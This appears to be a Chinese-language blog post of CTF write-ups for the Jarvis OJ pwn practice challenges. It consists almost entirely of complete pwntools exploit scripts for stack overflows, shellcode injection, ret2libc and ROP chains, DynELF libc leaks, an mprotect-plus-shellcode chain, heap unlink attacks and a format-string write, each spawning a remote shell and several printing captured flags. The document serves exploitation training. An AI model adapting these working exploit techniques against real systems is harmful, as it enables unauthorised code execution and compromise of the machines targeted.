---
layout: post
title:  "Jarvis OJ-从Pwn到去世"
date:   2019-2-12
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,JarvisOJ,Pwn]
icon: icon-html
---

# Jarvis OJ-从Pwn到去世

* #### Tell Me Something 

  ```python
  from pwn import *
  sh = remote("pwn.jarvisoj.com",9876)
  payload = 'a'*136 + p64(0x0000000000400620) 
  sh.recvuntil("message:\n")
  sh.sendline(payload)
  print(sh.recv())
  #PCTF{This_is_J4st_Begin}
  ```

* #### Test Your Memory

   ```python
   from pwn import *
   sh = remote("pwn2.jarvisoj.com",9876)
   elf =ELF("./memory") 
   win_func_addr = elf.symbols['win_func']
   catFlag_addr = 0x080487E0
   padding = 'a' * (0x13 + 0x4)
   payload = padding
   payload += p32(win_func_addr) + p32(0x08048677) + p32(catFlag_addr)
   
   sh.sendline(payload)
   print(sh.recv())
   print(sh.recv())
   #CTF{332e294fb7aeeaf0e1c7703a29304343}
   ```

* #### Smashes 

   ```python
   from pwn import *
   r = remote('pwn.jarvisoj.com',9877)
   flag_addr = 0x400d20
   payload = 'a' * 0x218 + p64(flag_addr)
   #payload = p64(0x400d21) * 1000
   r.sendline(payload)
   r.interactive()
   #PCTF{57dErr_Smasher_good_work!}
   ```

   

* #### [XMAN]level0

  64位文件

  ![12](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/12.png)

  在read处溢出，调用callsystem

  buf大小为0x80，填充buf，覆盖rbp，改vulnerable_function的返回地址

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com', 9881)
  call = p64(0x400596)
  payload = 'a'*0x88 + call
  r.sendline(payload)
  r.interactive()
  ```

  ![13](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/13.png)

  `CTF{713ca3944e92180e0ef03171981dcd41}`

  

* #### [XMAN]level1

  ![14](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/14.png)

  在read处溢出，前面输出buf的地址

  没有system函数

  ![15](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/15.png)

  没有开启NX，可以用shellcode

  buf的大小为0x88，输入shellcode，填充buf，覆盖ebp，把返回地址改为buf的地址

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com', 9877)
  context(log_level = 'debug', arch = 'i386', os = 'linux')
  shellcode = asm(shellcraft.sh())
  a = r.recvline()[14: -2]
  buf = int(a,16)
  payload = shellcode + 'a'*(0x88+0x4-len(shellcode)) + p32(buf)
  r.sendline(payload)
  r.interactive()
  
  ```

  ![16](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/16.png)

  `CTF{82c2aa534a9dede9c3a0045d0fec8617}`

  

* #### [XMAN]level2

  在read处溢出，有system函数

  查找有没有/bin/sh

  ![18](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/18.png)

  可以构造system("/bin/sh") 

  填充buf，覆盖ebp，把返回地址改为system的地址，设置system的返回地址，传参给system

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com',9878)
  system =p32(0x8048320)
  binsh = p32(0x804a024)
  payload = 'a'*(0x88+4) + system + p32(0) + binsh
  r.sendline(payload)
  r.interactive()
  #CTF{1759d0cbd854c54ffa886cd9df3a3d52}
  ```

   ![19](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/19.png)

* #### [XMAN]level2(x64)

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9882)
   sys_addr = 0x4004C0
   pop_rdi_ret = 0x4006b3
   binsh = 0x600A90
   padding = 'a' * (0x80 + 0x8)
   payload = padding + p64(pop_rdi_ret) + p64(binsh) + p64(sys_addr)
   r.sendline(payload)
   r.interacctive()
   #CTF{081ecc7c8d658409eb43358dcc1cf446}
   ```

   

* ####  [XMAN]level3

   ![21](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/21.png)

     开了NX，给出libc，考虑ret2libc

     ![22](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/22.png)

     read处存在溢出

     两次溢出，第一次溢出调用write，打印出一个函数的真实地址，通过这个地址和该函数在libc中的偏移地址计算libc基址，最终得到system的真实地址，第二次溢出执行system("/bin/sh")	

   ```python
     from pwn import *
     
     r = remote("pwn2.jarvisoj.com",9879)
     elf = ELF("./level3")
     libc = ELF("./libc-2.19.so")
     write_plt = elf.plt["write"]
     libc_start_got = elf.got['__libc_start_main']
     func = elf.symbols["vulnerable_function"]
     system_libc = libc.symbols["system"]
     binsh_libc = libc.search("/bin/sh").next()
     libc_start_libc = libc.symbols["__libc_start_main"]
     padding = 'a' * (0x88 + 0x4)
     payload1 = padding + p32(write_plt) + p32(func) + p32(1)+p32(libc_start_got)+p32(4) 
     r.recvuntil("Input:\n")
     r.sendline(payload1)
     
     leak_addr = u32(r.recv(4))
     libc_base = leak_addr - libc_start_libc
     system_addr = libc_base + system_libc
     binsh_addr = libc_base + binsh_libc
     
     payload2 = padding + p32(system_addr) + p32(func) + p32(binsh_addr)
     r.recvuntil("Input:\n")
     r.sendline(payload2)
     r.interactive()
     #CTF{d85346df5770f56f69025bc3f5f1d3d0}
   ```

* #### [XMAN]level3(x64)

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9883)
   elf = ELF('./level3_x64')
   libc = ELF('./libc-2.19.so')
   
   pwn_addr = 0x4005E6
   sys_libc = libc.symbols['system']
   write_libc = libc.symbols['write']
   binsh_libc = libc.search('/bin/sh').next()
   
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   
   pop_rdi_ret = 0x4006b3
   pop_rsi_p_r_ret = 0x4006b1
   padding = 'a' * (0x80 + 0x8)
   
   payload = padding
   payload += p64(pop_rdi_ret) + p64(1)
   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
   payload += p64(write_plt)
   payload += p64(pwn_addr)
   
   r.recvuntil('Input:\n')
   r.sendline(payload)
   leak_addr = u64(r.recv(8))
   #print(hex(leak_addr))
   
   libc_base = leak_addr - write_libc
   binsh = binsh_libc + libc_base
   system = sys_libc + libc_base
   
   payload2 = padding + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
   r.recvuntil('Input:\n')
   r.sendline(payload2)
   r.interactive()
   #CTF{b1aeaa97fdcc4122533290b73765e4fd}
   ```

   

* #### [XMAN]level4

   ![23](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/23.png)

    ![24](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/24.png)

   栈溢出，ret2libc

   先通过write搞到system地址，没给出libc那就用DynELF

   搞到地址之后再次溢出，先调用read在bss段写入/bin/sh，返回到system执行

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9880)
   elf = ELF('./level4')
   padding = 'a' * (0x88 + 0x4)
   write_addr = elf.plt['write']
   main_addr = elf.symbols['main']
   read_addr = elf.plt['read']
   
   def leak(addr):
   	payload = padding
   	payload += p32(write_addr)
   	payload += p32(main_addr)
   	payload += p32(1) + p32(addr) + p32(4)
   	r.sendline(payload)
   	leak_addr = r.recv(4)
   	return leak_addr
   
   d = DynELF(leak,elf = ELF('./level4'))
   system_addr = d.lookup('system','libc')
   print(hex(system_addr))
   
   bss_addr = elf.bss()
   payload1 = padding
   payload1 += p32(read_addr)
   payload1 += p32(system_addr)
   payload1 += p32(0) + p32(bss_addr) + p32(8)
   payload1 += p32(bss_addr)
   
   r.sendline(payload1)
   r.sendline('/bin/sh\0')
   r.interactive()
   #CTF{882130cf51d65fb705440b218e94e98e}
   ```

   

* #### [XMAN]level5

   假设system和execve函数被禁用 

   ```c
   //mprotect() 
   #include <unistd.h>
   #include <sys/mmap.h>
   int mprotect(const void *start, size_t len, int prot);
   
   /*
   把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
   */
   ```

   先通过write泄露libc，然后调用mprotect()把bss段权限设为可读可写可执行（7），再调用read()在bss段写入shellcode，返回到bss段执行shellcode

   ```python
   from pwn import *
   import sys
   r = remote('pwn2.jarvisoj.com', 9884)
   elf = ELF('./level3_x64')
   libc = ELF('./libc-2.19.so')
   context.binary = "./level3_x64"
   
   shellcode = asm(shellcraft.sh())
   padding = 'a' * (0x80 + 0x8)
   pwn_addr = 0x4005E6
   
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   write_libc =  libc.symbols['write']
   
   read_plt = elf.plt['read']
   
   mprotect_libc = libc.symbols['mprotect']
   
   pop_rdi_ret = 0x4006b3
   pop_rsi_p_r_ret = 0x4006b1
   
   payload = padding
   payload += p64(pop_rdi_ret) + p64(1)
   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
   payload += p64(write_plt)
   payload += p64(pwn_addr)
   
   
   r.recvuntil('Input:\n')
   r.sendline(payload)
   leak_addr = u64(r.recv(8))
   
   libc_base = leak_addr - write_libc
   mprotect = libc_base + libc.symbols['mprotect']
   pop_rsi = libc_base + 0x24885
   pop_rdx = libc_base + 0x1B8E
   
   
   payload2 = padding + p64(pop_rdi_ret)
   payload2 += p64(0x600000) + p64(pop_rsi)
   payload2 += p64(0x10000) + p64(pop_rdx)
   payload2 += p64(7) + p64(mprotect) + p64(pwn_addr)
   r.recvuntil('Input:\n')
   r.sendline(payload2)
   
   bss = elf.bss()
   
   payload3 = padding + p64(pop_rdi_ret)
   payload3 += p64(0) + p64(pop_rsi)
   payload3 += p64(bss) + p64(pop_rdx)
   payload3 += p64(0x100) + p64(read_plt) + p64(bss)
   r.recvuntil('Input:\n')
   r.sendline(payload3)
   r.send(shellcode)
   
   r.interactive()
   
   ```

* #### Guestbooks2

   chunk0储存chunk指针

   1. free chunk4、chunk2，此时chunk2的fd指向chunk4
   2. edit chunk1，覆盖到chunk2的fd前，list可获得chunk4地址
   3. unlink
   4. 泄露libc
   5. 改atoi的got，getshell

   ```python
   from pwn import *
   context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
   #r = remote('pwn.jarvisoj.com',9879)
   #context.log_level = "debug"
   r = process(['./guestbook2'],env = {"LD_PRELOAD":"./libc.so.6"})
   elf = ELF('./guestbook2')
   libc = ELF('./libc.so.6')
   
   def list():
   	r.sendlineafter('Your choice:','1')
   
   def new(post):
   	r.sendlineafter('Your choice:','2')
   	r.sendlineafter('Length of new post:',str(len(post)))
   	r.sendlineafter('Enter your post:',post)
   
   def edit(index, post):
   	r.sendlineafter('Your choice:','3')
   	r.sendlineafter('Post number:',str(index))
   	r.sendlineafter('Length of post:',str(len(post)))
   	r.sendlineafter('Enter your post:',post)
   
   def delete(index):
   	r.sendlineafter('Your choice:','4')
   	r.sendlineafter('Post number:',str(index))
   
   for i in range(10):
   	new('f**k')
   
   #leak heap
   delete(3)
   delete(1)
   padding = 'f**k' * ((0x80 + 0x10)/4)
   edit(0, padding)
   list()
   r.recvuntil(padding)
   chunk3 = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00'))
   heap_base = chunk3 - 6176 - 0x90 * 3
   chunk0 = heap_base + 0x30
   print(heap_base)
   print(chunk0)
   #unlink
   payload = p64(0x90) + p64(0x80) + p64(chunk0 - 0x18) + p64(chunk0 - 0x10)
   payload += 'f**k' * ((0x80 - 4 * 8)/4)
   payload += p64(0x80) + p64(0x90) + 'f**k' * (0x70/4)
   edit(0, payload)
   delete(1)
   gdb.attach(r)
   #leak libc
   payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0 - 0x18)
   payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
   payload = payload.ljust(0x100, '\x00')
   edit(0, payload)
   list()
   #gdb.attach(r)
   r.recvuntil("0. ")
   r.recvuntil("1. ")
   libc.address = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.sym["atoi"]
   #get shell
   edit(1, p64(libc.sym['system']))
   r.sendlineafter("choice: ", "/bin/sh")
   r.interactive()
   
   ```

   

* #### [Xman]level6_x64

   ```python
   from pwn import *
   context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
   r = remote('pwn2.jarvisoj.com',9886)
   #context.log_level = "debug"
   #r = process(['./freenote_x64'],env = {"LD_PRELOAD":"./libc-2.19.so"})
   elf = ELF('./freenote_x64')
   libc = ELF('./libc-2.19.so')
   
   def list():
   	r.sendlineafter('Your choice:','1')
   
   def new(note):
   	r.sendlineafter('Your choice:','2')
   	r.sendlineafter('Length of new note:',str(len(note)))
   	r.sendlineafter('Enter your note:',note)
   
   def edit(index, note):
   	r.sendlineafter('Your choice:','3')
   	r.sendlineafter('Note number:',str(index))
   	r.sendlineafter('Length of note:',str(len(note)))
   	r.sendlineafter('Enter your note:',note)
   
   def delete(index):
   	r.sendlineafter('Your choice:','4')
   	r.sendlineafter('Note number:',str(index))
   
   
   for i in range(10):
   	new('f**k')
   
   #leak heap
   delete(3)
   delete(1)
   padding = 'f**k' * ((0x80 + 0x10)/4)
   edit(0, padding)
   list()
   r.recvuntil(padding)
   chunk3 = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00'))
   heap_base = chunk3 - 6176 - 0x90 * 3
   chunk0 = heap_base + 0x30
   print(heap_base)
   print(chunk0)
   #gdb.attach(r)
   #unlink
   payload = p64(0x90) + p64(0x80) + p64(chunk0 - 0x18) + p64(chunk0 - 0x10)
   payload += 'f**k' * ((0x80 - 4 * 8)/4)
   payload += p64(0x80) + p64(0x90) + 'f**k' * (0x70/4)
   edit(0, payload)
   #gdb.attach(r)
   delete(1)
   #leak libc
   #gdb.attach(r)
   payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0 - 0x18)
   payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
   payload = payload.ljust(0x100, '\x00')
   edit(0, payload)
   list()
   #gdb.attach(r)
   r.recvuntil("0. ")
   r.recvuntil("1. ")
   libc.address = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.sym["atoi"]
   #get shell
   edit(1, p64(libc.sym['system']))
   r.sendlineafter("choice: ", "/bin/sh")
   r.interactive()
   
   ```

* ### [61dctf]fm

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com',9895)
   fuck = fmtstr_payload(11,{0x804A02C:4})
   print(fuck)
   r.sendline(fuck)
   r.interactive()
   ```

   
   
* ### Typo

   ```
   from pwn import *
   r = remote('pwn2.jarvisoj.com',9888)
   elf = ELF("typo")
   system = 0x110b4
   binsh = 0x6c384
   pop_r0_r4_pc = 0x20904
   payload = 'a'*0x70+p32(pop_r0_r4_pc)+p32(binsh)+p32(0)+p32(system)
   r.sendline('')
   r.sendline(payload)
   r.interactive()
   ```

   
